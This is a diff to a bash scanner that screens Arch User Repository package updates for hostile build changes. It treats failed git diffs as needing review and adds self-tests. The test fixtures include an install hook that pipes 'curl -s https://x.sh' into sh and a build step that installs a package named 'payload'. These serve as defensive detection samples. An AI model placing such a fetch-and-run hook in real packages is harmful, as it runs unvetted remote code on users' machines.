@@ -157,9 +157,12 @@ find_pkg_dir() {
 
 # Emit only ADDED lines from a git diff (leading '+' stripped, '+++' headers
 # skipped). Binary blobs and patch files are excluded (see EXCLUDE_PATHS).
+# Assert git diff exit code: with pipefail, a pipeline masks git's failure
+# behind sed — capture first (finding C; REVIEWER-NOTES §3).
 diff_added() {
-  git --no-pager diff "$@" -- "${EXCLUDE_PATHS[@]}" 2>/dev/null \
-    | sed -n '/^+++/!s/^+//p'
+  local diff_out
+  diff_out=$(git --no-pager diff "$@" -- "${EXCLUDE_PATHS[@]}" 2>/dev/null) || return 1
+  sed -n '/^+++/!s/^+//p' <<<"$diff_out"
 }
 
 # Domains seen in # Maintainer: / # Contributor: lines at a given ref.
@@ -445,7 +448,10 @@ _stage_scan_if_gating() {
 scan_diff_rules() {
   local pkg="$1" dir="$2" base_ref="$3"
   local added
-  added=$(cd "$dir" && diff_added "${base_ref}..origin/${AUR_REMOTE_BRANCH}")
+  if ! added=$(cd "$dir" && diff_added "${base_ref}..origin/${AUR_REMOTE_BRANCH}"); then
+    log "  $(c_yellow "review") $pkg — could not diff vs baseline (corrupt repo? missing object?)"
+    return 2
+  fi
 
   local hard_hits=0
   local i
@@ -580,7 +586,8 @@ missing_cache_gate() {
       rm -rf "${dir%/*}"
       case $rc in
         1) return 1 ;;   # hard-fail: do NOT stage (blocked update → no build)
-        2) _stage_scan_if_gating "$pkg"; return 2 ;;
+        2) [[ -f "$STATE_DIR/flag.${pkg}.diff" ]] && _stage_scan_if_gating "$pkg"
+           return 2 ;;
         *) _stage_scan_if_gating "$pkg"
            log "$(c_green "ok")    $pkg — no flagged changes (baseline-recovery diff)"
            return 0 ;;
@@ -592,7 +599,12 @@ missing_cache_gate() {
   fi
 
   # Tier 2: whole-file absolute scan, hard-rules-only, review level.
-  _scan_whole_pkg "$dir"; rm -rf "${dir%/*}"
+  if ! _scan_whole_pkg "$dir"; then
+    rm -rf "${dir%/*}"
+    log "  $(c_yellow "review") $pkg — empty PKGBUILD (no content to scan)"
+    return 2
+  fi
+  rm -rf "${dir%/*}"
   if (( SCAN_HITS )); then
     printf '%s\n' "$SCAN_CONTENT" >"$STATE_DIR/flag.${pkg}.diff"
     ln -sf "flag.${pkg}.diff" "$STATE_DIR/last-flag.diff" 2>/dev/null || true
@@ -645,7 +657,15 @@ check_pkg() {
   base_ref=$(accepted_ref "$dir" "$pkgbase") || base_ref=HEAD
 
   # No changes vs the accepted ref => clean. Do NOT stage (nothing to accept).
-  if [[ -z "$(git -C "$dir" diff --name-only "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null)" ]]; then
+  # Assert git diff exit code — empty output from a failed diff is not "clean"
+  # (finding C; REVIEWER-NOTES §3).
+  local changes
+  if ! changes=$(git -C "$dir" diff --name-only \
+      "${base_ref}..origin/${AUR_REMOTE_BRANCH}" 2>/dev/null); then
+    log "$(c_yellow "review") $pkg — could not diff vs accepted ref (corrupt baseline?)"
+    return 2
+  fi
+  if [[ -z "$changes" ]]; then
     log "$(c_green "ok")    $pkg — no source changes (version bump only?)"
     return 0
   fi
@@ -657,7 +677,8 @@ check_pkg() {
   # blocked update never reaches the helper, so there's nothing to accept.
   scan_diff_rules "$pkg" "$dir" "$base_ref"; local rc=$?
   case $rc in
-    2) _stage_if_gating "$pkgbase" "$dir"; return 2 ;;
+    2) [[ -f "$STATE_DIR/flag.${pkg}.diff" ]] && _stage_if_gating "$pkgbase" "$dir"
+       return 2 ;;
     0) _stage_if_gating "$pkgbase" "$dir"
        log "$(c_green "ok")    $pkg"
        return 0 ;;
@@ -1215,13 +1236,14 @@ cmd_selftest() {
   # Also a review-only fixture (pip) to prove scan_clone does NOT run review
   # rules, and an evil-install fixture (payload in .install, not PKGBUILD) to
   # prove the sourced-script surface is scanned.
-  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/src/review-pkg" "$_fbx/src/evil-install" "$_fbx/aur"
+  mkdir -p "$_fbx/src/clean-pkg" "$_fbx/src/evil-pkg" "$_fbx/src/review-pkg" "$_fbx/src/evil-install" "$_fbx/src/empty-pkg" "$_fbx/aur"
   printf 'pkgname=clean-pkg\npkgver=1\npkgrel=1\nsource=("https://example.com/x.tar")\n' >"$_fbx/src/clean-pkg/PKGBUILD"
   printf 'pkgname=evil-pkg\npkgver=1\npkgrel=1\nbuild() { npm install payload; }\n' >"$_fbx/src/evil-pkg/PKGBUILD"
   printf 'pkgname=review-pkg\npkgver=1\npkgrel=1\nbuild() { pip install requests; }\n' >"$_fbx/src/review-pkg/PKGBUILD"
   printf 'pkgname=evil-install\npkgver=1\npkgrel=1\ninstall=evil.install\n' >"$_fbx/src/evil-install/PKGBUILD"
   printf 'post_install() { curl -s https://x.sh | sh; }\n' >"$_fbx/src/evil-install/evil.install"
-  for _p in clean-pkg evil-pkg review-pkg evil-install; do
+  : >"$_fbx/src/empty-pkg/PKGBUILD"
+  for _p in clean-pkg evil-pkg review-pkg evil-install empty-pkg; do
     git -C "$_fbx/src/$_p" -c init.defaultBranch=master init -q
     git -C "$_fbx/src/$_p" add -A; git -C "$_fbx/src/$_p" -c user.email=t@t -c user.name=t commit -qm base
     git clone -q --bare "$_fbx/src/$_p" "$_fbx/aur/$_p.git"
@@ -1241,6 +1263,7 @@ cmd_selftest() {
   ta "uncached-evil-returns-review"    2 check_pkg evil-pkg
   ta "uncached-review-only-returns-ok" 0 check_pkg review-pkg
   ta "uncached-install-hit-returns-2"  2 check_pkg evil-install
+  ta "uncached-empty-pkgbuild-review"  2 check_pkg empty-pkg
   # clone failure (no such fixture) → review (consent), never silent passthrough
   ta "uncached-clonefail-returns-review" 2 check_pkg nonexistent-pkg
 
@@ -1464,6 +1487,53 @@ cmd_selftest() {
     fail=$((fail+1))
   fi
   rm -rf "$_tr_clone"
+
+  # --- diff failure must not look clean (finding C) ------------------------
+  # Corrupt accepted anchor or missing git object → review (2), never clean (0).
+  # Staging only on real review hits (flag stashed), not on audit-unavailable.
+  log ""
+  log "  $(c_dim "-- diff failure (finding C) --")"
+  local _dfx _dfs _dfsha
+  _dfx=$(mktemp -d); _dfs=$(mktemp -d)
+  mkdir -p "$_dfx/src/df-pkg"
+  printf 'pkgname=df-pkg\npkgver=1\npkgrel=1\n' >"$_dfx/src/df-pkg/PKGBUILD"
+  git -C "$_dfx/src/df-pkg" -c init.defaultBranch=master init -q
+  git -C "$_dfx/src/df-pkg" add -A
+  git -C "$_dfx/src/df-pkg" -c user.email=t@t -c user.name=t commit -qm base
+  git -C "$_dfx/src/df-pkg" branch -qM master
+  git -C "$_dfx/src/df-pkg" update-ref refs/remotes/origin/master HEAD
+  _dfsha=$(git -C "$_dfx/src/df-pkg" rev-parse HEAD)
+  if ( cd "$_dfx/src/df-pkg" && diff_added "0000000000000000000000000000000000000000..HEAD" >/dev/null ); then
+    log "  $(c_red "FAIL") diff-added-bad-ref-fails"; fail=$((fail+1))
+  else
+    log "  $(c_green "PASS") diff-added-bad-ref-fails"; pass=$((pass+1))
+  fi
+  local _sdrc
+  scan_diff_rules df-pkg "$_dfx/src/df-pkg" "0000000000000000000000000000000000000000" >/dev/null
+  _sdrc=$?
+  if [ "$_sdrc" -eq 2 ]; then
+    log "  $(c_green "PASS") scan-diff-bad-ref-review"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") scan-diff-bad-ref-review (expected rc 2, got $_sdrc)"; fail=$((fail+1))
+  fi
+  local _df_sd _df_ad _df_st _df_mf
+  _df_sd="$STATE_DIR"; STATE_DIR="$_dfs"
+  _df_ad="$ACCEPTED_DIR"; ACCEPTED_DIR="$_dfs/accepted"
+  _df_st="$STAGED_DIR"; STAGED_DIR="$_dfs/staged"
+  mkdir -p "$ACCEPTED_DIR" "$STAGED_DIR"
+  _df_mf="$MANIFEST_FILE"; MANIFEST_FILE="$_dfs/last-gate"; : >"$MANIFEST_FILE"
+  printf '%s\t%s\t%s\n' "0000000000000000000000000000000000000000" "1970-01-01T00:00:00Z" "" \
+    >"$ACCEPTED_DIR/df-pkg"
+  _AUR_TEST_DIR="$_dfx/src/df-pkg"
+  AUR_SAFE_STAGING=1
+  ta "corrupt-anchor-returns-review" 2 check_pkg df-pkg
+  if [ ! -f "$STAGED_DIR/df-pkg" ]; then
+    log "  $(c_green "PASS") corrupt-anchor-no-stage"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") corrupt-anchor-no-stage"; fail=$((fail+1)); fi
+  AUR_SAFE_STAGING=""
+  STATE_DIR="$_df_sd"; ACCEPTED_DIR="$_df_ad"; STAGED_DIR="$_df_st"; MANIFEST_FILE="$_df_mf"
+  _AUR_TEST_DIR=""
+  rm -rf "$_dfx" "$_dfs"
 
   _AUR_TEST_Q=""
   unset -f _bl_bld
